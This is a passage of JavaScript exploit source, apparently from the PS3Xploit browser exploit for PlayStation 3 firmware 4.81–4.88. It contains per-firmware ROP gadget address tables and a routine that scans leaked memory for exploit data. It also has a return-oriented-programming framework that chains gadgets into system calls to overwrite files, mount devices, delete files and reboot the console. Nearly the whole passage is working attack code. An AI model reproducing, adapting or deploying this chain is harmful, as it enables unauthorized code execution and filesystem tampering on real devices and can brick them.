	gadget11_addr=gadget11_addr_485;
	gadget12_addr=gadget12_addr_485;
	gadget13_addr=gadget13_addr_485;
	gadget14_addr=gadget14_addr_485;
	gadget15_addr=gadget15_addr_485;
	gadget_mod1_addr=gadget_mod1_addr_485;
	gadget_mod2_addr=gadget_mod2_addr_485;
	gadget_mod3_addr=gadget_mod3_addr_485;
	gadget_mod4a_addr=gadget_mod4a_addr_485;
	gadget_mod4b_addr=gadget_mod4b_addr_485;
	gadget_mod4c_addr=gadget_mod4c_addr_485;
	gadget_mod5_addr=gadget_mod5_addr_485;
	gadget_mod6_addr=gadget_mod6_addr_485;
	gadget_mod7_addr=gadget_mod7_addr_485;
	gadget_mod8_addr=gadget_mod8_addr_485;
	gadget_mod9_addr=gadget_mod9_addr_485;
	gadget_mod10_addr=gadget_mod10_addr_485;
	gadget_mod11_addr=gadget_mod11_addr_485;
	gadget_mod12_addr=gadget_mod12_addr_485;
	gadget_mod13_addr=gadget_mod13_addr_485;
	gadget_mod14_addr=gadget_mod14_addr_485;
	gadget_mod15_addr=gadget_mod15_addr_485;
	gadget_mod16_addr=gadget_mod16_addr_485;
	ipf1_addr=ipf1_addr_485;
	ipf2_addr=ipf2_addr_485;
}

function loadcex_486()
{
	toc_addr = toc_addr_486;
	vsh_opd_addr=vsh_opd_addr_486;
	vsh_opd_patch=vsh_opd_patch_486;
	vsh_toc_addr_screenshot=vsh_toc_addr_screenshot_486;
	vsh_ps3xploit_key_toc=vsh_ps3xploit_key_toc_486;
	default_vsh_pub_toc=default_vsh_pub_toc_486;
	toc_entry1_addr=toc_entry1_addr_486;
	toc_entry2_addr=toc_entry2_addr_486;
	toc_entry3_addr=toc_entry3_addr_486;
	toc_entry4_addr=toc_entry4_addr_486;
	toc_entry5_addr=toc_entry5_addr_486;
	toc_entry6_addr=toc_entry6_addr_486;
	gadget1_addr=gadget1_addr_486;
	gadget2_addr=gadget2_addr_486;
	gadget3_addr=gadget3_addr_486;
	gadget4_addr=gadget4_addr_486;
	gadget5_addr=gadget5_addr_486;
	gadget6_addr=gadget6_addr_486;
	gadget7_addr=gadget7_addr_486;
	gadget8_addr=gadget8_addr_486;
	gadget9_addr=gadget9_addr_486;
	gadget10_addr=gadget10_addr_486;
	gadget11_addr=gadget11_addr_486;
	gadget12_addr=gadget12_addr_486;
	gadget13_addr=gadget13_addr_486;
	gadget14_addr=gadget14_addr_486;
	gadget15_addr=gadget15_addr_486;
	gadget_mod1_addr=gadget_mod1_addr_486;
	gadget_mod2_addr=gadget_mod2_addr_486;
	gadget_mod3_addr=gadget_mod3_addr_486;
	gadget_mod4a_addr=gadget_mod4a_addr_486;
	gadget_mod4b_addr=gadget_mod4b_addr_486;
	gadget_mod4c_addr=gadget_mod4c_addr_486;
	gadget_mod5_addr=gadget_mod5_addr_486;
	gadget_mod6_addr=gadget_mod6_addr_486;
	gadget_mod7_addr=gadget_mod7_addr_486;
	gadget_mod8_addr=gadget_mod8_addr_486;
	gadget_mod9_addr=gadget_mod9_addr_486;
	gadget_mod10_addr=gadget_mod10_addr_486;
	gadget_mod11_addr=gadget_mod11_addr_486;
	gadget_mod12_addr=gadget_mod12_addr_486;
	gadget_mod13_addr=gadget_mod13_addr_486;
	gadget_mod14_addr=gadget_mod14_addr_486;
	gadget_mod15_addr=gadget_mod15_addr_486;
	gadget_mod16_addr=gadget_mod16_addr_486;
	ipf1_addr=ipf1_addr_486;
	ipf2_addr=ipf2_addr_486;
}
function loadcex_487()
{
	toc_addr = toc_addr_487;
	vsh_opd_addr=vsh_opd_addr_487;
	vsh_opd_patch=vsh_opd_patch_487;
	vsh_toc_addr_screenshot=vsh_toc_addr_screenshot_487;
	vsh_ps3xploit_key_toc=vsh_ps3xploit_key_toc_487;
	default_vsh_pub_toc=default_vsh_pub_toc_487;
	toc_entry1_addr=toc_entry1_addr_487;
	toc_entry2_addr=toc_entry2_addr_487;
	toc_entry3_addr=toc_entry3_addr_487;
	toc_entry4_addr=toc_entry4_addr_487;
	toc_entry5_addr=toc_entry5_addr_487;
	toc_entry6_addr=toc_entry6_addr_487;
	gadget1_addr=gadget1_addr_487;
	gadget2_addr=gadget2_addr_487;
	gadget3_addr=gadget3_addr_487;
	gadget4_addr=gadget4_addr_487;
	gadget5_addr=gadget5_addr_487;
	gadget6_addr=gadget6_addr_487;
	gadget7_addr=gadget7_addr_487;
	gadget8_addr=gadget8_addr_487;
	gadget9_addr=gadget9_addr_487;
	gadget10_addr=gadget10_addr_487;
	gadget11_addr=gadget11_addr_487;
	gadget12_addr=gadget12_addr_487;
	gadget13_addr=gadget13_addr_487;
	gadget14_addr=gadget14_addr_487;
	gadget15_addr=gadget15_addr_487;
	gadget_mod1_addr=gadget_mod1_addr_487;
	gadget_mod2_addr=gadget_mod2_addr_487;
	gadget_mod3_addr=gadget_mod3_addr_487;
	gadget_mod4a_addr=gadget_mod4a_addr_487;
	gadget_mod4b_addr=gadget_mod4b_addr_487;
	gadget_mod4c_addr=gadget_mod4c_addr_487;
	gadget_mod5_addr=gadget_mod5_addr_487;
	gadget_mod6_addr=gadget_mod6_addr_487;
	gadget_mod7_addr=gadget_mod7_addr_487;
	gadget_mod8_addr=gadget_mod8_addr_487;
	gadget_mod9_addr=gadget_mod9_addr_487;
	gadget_mod10_addr=gadget_mod10_addr_487;
	gadget_mod11_addr=gadget_mod11_addr_487;
	gadget_mod12_addr=gadget_mod12_addr_487;
	gadget_mod13_addr=gadget_mod13_addr_487;
	gadget_mod14_addr=gadget_mod14_addr_487;
	gadget_mod15_addr=gadget_mod15_addr_487;
	gadget_mod16_addr=gadget_mod16_addr_487;
	ipf1_addr=ipf1_addr_487;
	ipf2_addr=ipf2_addr_487;
}
function loadcex_488()
{
	toc_addr = toc_addr_488;
	vsh_opd_addr=vsh_opd_addr_488;
	vsh_opd_patch=vsh_opd_patch_488;
	vsh_toc_addr_screenshot=vsh_toc_addr_screenshot_488;
	vsh_ps3xploit_key_toc=vsh_ps3xploit_key_toc_488;
	default_vsh_pub_toc=default_vsh_pub_toc_488;
	toc_entry1_addr=toc_entry1_addr_488;
	toc_entry2_addr=toc_entry2_addr_488;
	toc_entry3_addr=toc_entry3_addr_488;
	toc_entry4_addr=toc_entry4_addr_488;
	toc_entry5_addr=toc_entry5_addr_488;
	toc_entry6_addr=toc_entry6_addr_488;
	gadget1_addr=gadget1_addr_488;
	gadget2_addr=gadget2_addr_488;
	gadget3_addr=gadget3_addr_488;
	gadget4_addr=gadget4_addr_488;
	gadget5_addr=gadget5_addr_488;
	gadget6_addr=gadget6_addr_488;
	gadget7_addr=gadget7_addr_488;
	gadget8_addr=gadget8_addr_488;
	gadget9_addr=gadget9_addr_488;
	gadget10_addr=gadget10_addr_488;
	gadget11_addr=gadget11_addr_488;
	gadget12_addr=gadget12_addr_488;
	gadget13_addr=gadget13_addr_488;
	gadget14_addr=gadget14_addr_488;
	gadget15_addr=gadget15_addr_488;
	gadget_mod1_addr=gadget_mod1_addr_488;
	gadget_mod2_addr=gadget_mod2_addr_488;
	gadget_mod3_addr=gadget_mod3_addr_488;
	gadget_mod4a_addr=gadget_mod4a_addr_488;
	gadget_mod4b_addr=gadget_mod4b_addr_488;
	gadget_mod4c_addr=gadget_mod4c_addr_488;
	gadget_mod5_addr=gadget_mod5_addr_488;
	gadget_mod6_addr=gadget_mod6_addr_488;
	gadget_mod7_addr=gadget_mod7_addr_488;
	gadget_mod8_addr=gadget_mod8_addr_488;
	gadget_mod9_addr=gadget_mod9_addr_488;
	gadget_mod10_addr=gadget_mod10_addr_488;
	gadget_mod11_addr=gadget_mod11_addr_488;
	gadget_mod12_addr=gadget_mod12_addr_488;
	gadget_mod13_addr=gadget_mod13_addr_488;
	gadget_mod14_addr=gadget_mod14_addr_488;
	gadget_mod15_addr=gadget_mod15_addr_488;
	gadget_mod16_addr=gadget_mod16_addr_488;
	ipf1_addr=ipf1_addr_488;
	ipf2_addr=ipf2_addr_488;
}
/*
function dex()
{
		if(document.getElementById('dex').checked===true){loaddex_481();}//alert("calling loaddex_481");
		else {loadcex_481();}
		disable_trigger();
}
*/
function dex()
{
	switch (fwVersion) {
		case "4.81":
			if(document.getElementById('dex').checked===true){loaddex_481();}//alert("calling loaddex_481");
			else {loadcex_481();}
			disable_trigger();
			break;
			
		case "4.82":
			if(document.getElementById('dex').checked===true){loaddex_482();}//alert("calling loaddex_482");
			else {loadcex_482();}
			disable_trigger();
			break;
			
		case "4.83":
			if(document.getElementById('dex').checked===true){loadcex_483();}//alert("calling loaddex_483");
			else {loadcex_483();}
			disable_trigger();
			break;
			
		case "4.84":
			if(document.getElementById('dex').checked===true){loaddex_484();}//alert("calling loaddex_484");
			else {loadcex_484();}
			disable_trigger();
			break;
			
		case "4.85":
			if(document.getElementById('dex').checked===true){loadcex_485();}//alert("calling loaddex_485");
			else {loadcex_485();}
			disable_trigger();
			break;
			
		case "4.86":
			if(document.getElementById('dex').checked===true){loadcex_486();}//alert("calling loaddex_486");
			else {loadcex_486();}
			disable_trigger();
			break;
			
		case "4.87":
			if(document.getElementById('dex').checked===true){loadcex_487();}//alert("calling loaddex_487");
			else {loadcex_487();}
			disable_trigger();
			break;
			
		case "4.88":
			if(document.getElementById('dex').checked===true){loadcex_488();}//alert("calling loaddex_488");
			else {loadcex_488();}
			disable_trigger();
			break;
			
		default:
			break;
	}
}
function initDEX()
{
	if((document.getElementById('dex'))&&(document.getElementById('dex_txt')))
	{
		setVisible(document.getElementById('dex_txt'));
		enable_element(document.getElementById('dex'));
	}
	else {throw "dex checkbox/dex span: HTML error";}
}
function showResult(str)
{
	setInnerHTML(document.getElementById('result'),str);
}
function findJsVariableOffset(name,exploit_data,base,size)
{
	readMemory(base,size);
	var dat=document.getElementById('exploit').style.src.substr(6,size);
	var i=0;
	var t;
	var k;
	var match;
	var exploit_addr;
	while(i<(dat.length*2))
	{
		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
		{
			match=0;
			for (k=0;k<(exploit_data.length*2);k+=0x2)
			{
				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2)){break;}
				match+=1;
			}
			if (match===exploit_data.length)
			{
				exploit_addr=base+i+4;
				
				for(t=0;t<offset_array.length;t+=1)
				{
					if(offset_array[t]===exploit_addr)
					{
						logAdd("Found "+name+" at: 0x"+exploit_addr.toString(16)+br+": Offset already used!");
						return -1;
					}
				}
				offset_array.push(exploit_addr);
				logAdd("Found "+name+" at: 0x"+exploit_addr.toString(16)+br+exploit_data.toAscii(true));
				return exploit_addr;
			}
		}
		i+=0x10;
	}
	var end_range=base+size;
	logAdd("The string variable named "+name+" could not be located in range 0x"+base.toString(16)+" - 0x"+end_range.toString(16));
	return 0;
}
//########################## ROP Framework functions by bguerville(currently under development) #########################
function copy_file_overwrite(frm,to,fd_frm,fd_to,buf,rlen,wlen,stat,nl,st_size)
{
	return memcpy(stat+stat_size_offset,nl,dword_size)
		+syscall(sc_fs_stat,frm,stat,0,0,0,0,0,0)
		+memcpy(st_size,stat+stat_size_offset,word_size)
		+syscall(sc_fs_open,frm,fs_flag_readonly,fd_frm,0,0,0,0,0)
		//+validate_word_from_ptr(fd_frm,to,0)
		+syscall_r3r5_p2p(sc_fs_read,fd_frm,buf,stat+stat_size_offset,rlen,0,0,0,0,0,0)
		+syscall_r3_p2p(sc_fs_close,fd_frm,0,0,0,0,0,0,0,0,0)
		+validate_word_from_ptr(rlen+0x4,to,0)
		+syscall(sc_fs_open,to,fs_flag_create,fd_to,fs_mode,nl,0,0,0)
		+syscall_r3r5_p2p(sc_fs_write,fd_to,buf,stat+stat_size_offset,wlen,0,0,0,0,0,0)
		+syscall_r3_p2p(sc_fs_close,fd_to,0,0,0,0,0,0,0,0,0);
}
function copy_file_overwrite_alt(frm,to,fd_frm,fd_to,buf,rlen,wlen,stat,nl,st_size)
{
	return memcpy(stat+stat_size_offset,nl,dword_size)
		+syscall(sc_fs_stat,frm,stat,0,0,0,0,0,0)
		+memcpy(st_size,stat+stat_size_offset,word_size)
		+syscall(sc_fs_open,frm,fs_flag_readonly,fd_frm,0,0,0,0,0)
		+syscall_r3r5_p2p(sc_fs_read,fd_frm,buf,stat+stat_size_offset,rlen,0,0,0,0,0,0)
		+syscall_r3_p2p(sc_fs_close,fd_frm,0,0,0,0,0,0,0,0,0)
		+syscall(sc_fs_open,to,fs_flag_create,fd_to,fs_mode,nl,0,0,0)
		+syscall_r3r5_p2p(sc_fs_write,fd_to,buf,stat+stat_size_offset,wlen,0,0,0,0,0,0)
		+syscall_r3_p2p(sc_fs_close,fd_to,0,0,0,0,0,0,0,0,0);
}
function save_file_overwrite(to,fd,buf,wlen,size,nl)
{
	return syscall(sc_fs_open, to, fs_flag_create, fd, fs_mode,nl,0,0,0)
		+syscall_r3_p2p(sc_fs_write, fd, buf, size, wlen,0,0,0,0,0,0)
		+syscall_r3_p2p(sc_fs_close,fd,0,0,0,0,0,0,0,0,0);
}
function mount_new_device(devsrc,devdest,part,fs,ptr)
{
	return syscall(sc_fs_unmount,devsrc,0,0,0,0,0,0,0)
		+syscall(sc_fs_unmount, devdest,0,0,0,0,0,0,0)
		if(ptr){+syscall(sc_fs_umount,part,fs,devdest,0,0,0,gtemp_addr,0);}else{+syscall(sc_fs_umount,part,fs,devdest,0,0,0,0,0);}
}
function optional_reboot_novalidation(unlink_ptr,shutdown_type,null_ptr)
{
	var auto=document.getElementById('auto_reboot');
	if(auto){if(auto.checked===true)return syscall(sc_fs_unlink,unlink_ptr,0,0,0,0,0,0,0)+syscall(sc_sm_shutdown,shutdown_type,null_ptr,0,0,0,0,0,0);}
	return '';
}

function optional_reboot_new(newframe,addr1,addr2,addr3,addr4,addr5)
{
	var auto=document.getElementById('auto_reboot');
	var t=['','','','',''];
	if(addr1)t[0]=validate_word_from_ptr(addr1+0x4,newframe+0x10,gadget_mod8_addr);
	if(addr2)t[1]=validate_word_from_ptr(addr2+0x4,newframe+0x10,gadget_mod8_addr);
	if(addr3)t[2]=validate_word_from_ptr(addr3+0x4,newframe+0x10,gadget_mod8_addr);
	if(addr4)t[3]=validate_word_from_ptr(addr4+0x4,newframe+0x10,gadget_mod8_addr);
	if(addr5)t[4]=validate_word_from_ptr(addr5+0x4,newframe+0x10,gadget_mod8_addr);
	if(auto){if(auto.checked===true)return t[0]+t[1]+t[2]+t[3]+t[4]+stack_frame_swap(newframe);}
	return '';
}
function optional_reboot(newframe,addr1,addr2,addr3,addr4,addr5)
{
	var auto=document.getElementById('auto_reboot');
	if(auto){if(auto.checked===true)return validate_word_from_ptr(addr1+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr2+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr3+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr4+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr5+0x4,newframe+0x10,gadget_mod8_addr)
	+stack_frame_swap(newframe);}
	return '';
}

function optional_reboot1(newframe,addr1)
{
	var auto=document.getElementById('auto_reboot');
	if(auto){if(auto.checked===true)return validate_word_from_ptr(addr1+0x4,newframe+0x10,gadget_mod8_addr)
	+stack_frame_swap(newframe);}
	return '';
}
function optional_reboot2(newframe,addr1,addr2)
{
	var auto=document.getElementById('auto_reboot');
	if(auto){if(auto.checked===true)return validate_word_from_ptr(addr1+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr2+0x4,newframe+0x10,gadget_mod8_addr)
	+stack_frame_swap(newframe);}
	return '';
}
function optional_reboot3(newframe,addr1,addr2,addr3)
{
	var auto=document.getElementById('auto_reboot');
	if(auto){if(auto.checked===true)return validate_word_from_ptr(addr1+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr2+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr3+0x4,newframe+0x10,gadget_mod8_addr)
	+stack_frame_swap(newframe);}
	return '';
}
function optional_reboot4(newframe,addr1,addr2,addr3,addr4)
{
	var auto=document.getElementById('auto_reboot');
	if(auto){if(auto.checked===true)return validate_word_from_ptr(addr1+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr2+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr3+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr4+0x4,newframe+0x10,gadget_mod8_addr)
	+stack_frame_swap(newframe);}
	return '';
}
function optional_reboot5(newframe,addr1,addr2,addr3,addr4,addr5)
{
	var auto=document.getElementById('auto_reboot');
	if(auto){if(auto.checked===true)return validate_word_from_ptr(addr1+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr2+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr3+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr4+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr5+0x4,newframe+0x10,gadget_mod8_addr)
	+stack_frame_swap(newframe);}
	return '';
}
function optional_reboot9(newframe,addr1,addr2,addr3,addr4,addr5,addr6,addr7,addr8,addr9)
{
	var auto=document.getElementById('auto_reboot');
	if(auto){if(auto.checked===true)return validate_word_from_ptr(addr1+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr2+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr3+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr4+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr5+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr6+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr7+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr8+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr9+0x4,newframe+0x10,gadget_mod8_addr)
	+stack_frame_swap(newframe);}
	return '';
}
function optional_reboot10(newframe,addr1,addr2,addr3,addr4,addr5,addr6,addr7,addr8,addr9,addr10)
{
	var auto=document.getElementById('auto_reboot');
	if(auto){if(auto.checked===true)return validate_word_from_ptr(addr1+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr2+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr3+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr4+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr5+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr6+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr7+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr8+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr9+0x4,newframe+0x10,gadget_mod8_addr)
	+validate_word_from_ptr(addr10+0x4,newframe+0x10,gadget_mod8_addr)
	+stack_frame_swap(newframe);}
	return '';
}
function validate_word_from_ptr(w_ptr,opt_store,val,r29out,r30out,r31out)
{
	if(r29out===null){r29out=gtemp_addr;}
	if(r30out===null){r30out=gtemp_addr;}
	if(r31out===null){r31out=gtemp_addr;}
	return load_r3_word_from_ptr_32(w_ptr,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr,opt_store,gtemp_addr)
	+hexdw2bin(gadget_mod12_addr)+fill_by_16bytes(0x70,dbyte00)+fill_by_8bytes(0x8,dbyte00)+hexdw2bin(val)+fill_by_16bytes(0x10,dbyte00)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41);

}
function validate_word_from_ptr_alt(w_ptr,opt_store,val,r29out,r30out,r31out)
{
	if(r29out===null){r29out=gtemp_addr;}
	if(r30out===null){r30out=gtemp_addr;}
	if(r31out===null){r31out=gtemp_addr;}
	return load_r3_word_from_ptr_32(w_ptr,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr)
	+hexdw2bin(gadget_mod12_addr)+fill_by_16bytes(0x70,dbyte00)+fill_by_8bytes(0x8,dbyte00)+hexdw2bin(val)+fill_by_16bytes(0x10,dbyte00)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41);

}
function padding()
{
	var auto=document.getElementById('auto_reboot');
	if(auto){if(auto.checked===false)return fill_by_16bytes(0x800,dbyte00);}
	return '';
	
}
function getlastUserId(storage_offset,act,uid,full_path,jmp,jmp2,r31out)
{
	if(r31out===null){r31out=gtemp_addr;}
	return callsub(gadget14_addr,0,0,0,0,0,0,0,0,0,0x90,toc_entry4_addr,jmp-0x8)
	+hexdw2bin(gadget_mod11_addr)+fill_by_16bytes(0x60,dbyte41)+fill_by_8bytes(0x8,dbyte41)+hexw2bin(uid)+fill_by_4bytes(0x4,dbyte00)+fill_by_16bytes(0x10,dbyte00)+hexw2bin(storage_offset+0x4)+fill_by_4bytes(0x4,dbyte00)+fill_by_8bytes(0x18,dbyte00)+hexdw2bin(storage_offset+0x4)+fill_by_16bytes(0x10,dbyte00)
	+hexdw2bin(gadget15_addr)+fill_by_16bytes(0x70,dbyte00)+hexdw2bin(r31out)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget_mod1_addr+0x20)+fill_by_16bytes(0x70,dbyte00)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(jmp2)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(storage_offset-0x8)+fill_by_16bytes(0x10,dbyte00)+hexdw2bin(gadget9_addr)+fill_by_16bytes(0x60,dbyte00)+hexdw2bin(full_path)+fill_by_16bytes(0x10,dbyte00)
	+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget11_addr)+fill_by_16bytes(0x90,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function malloc_(m_ptr_holder,size)
{
	return callsub(gadget6_addr,toc_entry4_addr,size,0,0,0,0,0,0,0,0x70)+store_r3_word(m_ptr_holder);
}
function memset_r3_p2p(m_ptr_holder,len,val)
{
	return callsub_r3_p2p(gadget7_addr,m_ptr_holder,len,val,0,0,0,0,0,0,0x70);
}
function memcpy_r3_p2p(m_ptr_dest,src,len)
{
	return callsub_r3_p2p(gadget8_addr,m_ptr_dest,src,len,0,0,0,0,0,0,0x70);
}
function memset(ptr,len,val)
{
	return callsub(gadget7_addr,ptr,len,val,0,0,0,0,0,0,0x70);
}
function memcpy(dest,src,len)
{
	return callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70);
}
function free_r3_p2p(ptr_to_ptr)
{
	return callsub_r3_p2p(gadget13_addr,ptr_to_ptr,0,0,0,0,0,0,0,0,0xA0);
}
function free(ptr)
{
	return callsub(gadget13_addr,ptr,0,0,0,0,0,0,0,0,0xA0);
}

function load_r3_word_from_ptr_32(offset,r26out,r27out,r28out,r29out,r30out,r31out)
{
	if(r26out===null){r26out=gtemp_addr;}
	if(r27out===null){r27out=gtemp_addr;}
	if(r28out===null){r28out=gtemp_addr;}
	if(r29out===null){r29out=gtemp_addr;}
	if(r30out===null){r30out=gtemp_addr;}
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+hexdw2bin(offset-0x8)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget_mod15_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(r26out)+hexdw2bin(r27out)+hexdw2bin(r28out)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function load_r3_dword_from_ptr_32(offset,r28out,r29out,r30out,r31out)
{
	if(r28out===null){r28out=gtemp_addr;}
	if(r29out===null){r29out=gtemp_addr;}
	if(r30out===null){r30out=gtemp_addr;}
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+hexdw2bin(offset-0x40)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget_mod14_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(r28out)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function store_r3_word(store_offset,r29out,r30out,r31out)
{
	if(r29out===null){r29out=gtemp_addr;}
	if(r30out===null){r30out=gtemp_addr;}
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod13_addr+0x4)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(store_offset-0x10)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget_mod13_addr)+fill_by_16bytes(0x50,dbyte41)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function store_word_from_ptr_32(store_offset,ptr_to_val,r29out,r30out,r31out)
{
	if(r29out===null){r29out=gtemp_addr;}
	if(r30out===null){r30out=gtemp_addr;}
	if(r31out===null){r31out=gtemp_addr;}
	return load_r3_word_from_ptr_32(ptr_to_val,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr)+ store_r3_word(store_offset,r29out,r30out,r31out);
}
function store_word(store_offset,val,r29out,r30out,r31out)
{
	if(r29out===null){r29out=gtemp_addr;}
	if(r30out===null){r30out=gtemp_addr;}
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(store_offset-0xC74)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function store_byte(store_offset,val,r26out,r27out,r28out,r29out,r30out,r31out)
{
	if(r26out===null){r26out=gtemp_addr;}
	if(r27out===null){r27out=gtemp_addr;}
	if(r28out===null){r28out=gtemp_addr;}
	if(r29out===null){r29out=gtemp_addr;}
	if(r30out===null){r30out=gtemp_addr;}
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x70,dbyte41)+fill_by_4bytes(0xC,dbyte41)
	+hexw2bin(store_offset-0x10)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(val)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget_mod10_addr)+fill_by_16bytes(0x60,dbyte41)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(r26out)+hexdw2bin(r27out)+hexdw2bin(r28out)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function set_toc(toc_offset,r29out)
{
	if(r29out===null){r29out=gtemp_addr;}
	return hexdw2bin(gadget_mod16_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(toc_offset)+fill_by_8bytes(0x48,dbyte41)+hexdw2bin(r29out)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function stack_frame_swap(new_stack_addr)
{
// to swap stack frame
// Usage: swap_sf = hexdw2bin(r31out)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(next gadget)+......;
// stack_frame_swap(swap_sf_addr+0x8)
return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+hexdw2bin(new_stack_addr)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(gadget_mod9_addr);
}
function stack_frame_hookup()
{
	return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41);
}
function stack_frame_exit()
{
	return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A");
}
function syscall_r3_p2p(sc,r3_ptr,r4,r5,r6,r7,r8,r9,r10,r31out)//r3 = the value found at pointer r3_ptr
{
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)
